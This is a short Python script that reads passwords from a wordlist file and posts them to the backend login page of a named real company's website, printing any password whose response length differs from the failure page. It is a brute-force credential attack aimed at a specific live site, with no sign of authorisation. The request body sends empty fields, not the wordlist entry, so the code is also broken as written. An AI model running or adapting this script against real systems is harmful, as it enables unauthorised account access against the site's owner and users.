import requests
URL="https://www.namtai.com/backend/account/login.html?class=form-validation&name=loginform"
with open("/mnt/home/CocRes/Password/pass.txt","r") as f:
    for i in f.readlines():
        data={"user":"","password":""}
        flag=requests.post(url=URL,data=data).content
        flag = str(flag,encoding="utf-8")
        print(len(flag))
        print(i.strip())
        if len(flag) != 1574:
            print(flag)
            print("password:"+i)
            print('\n')
            break

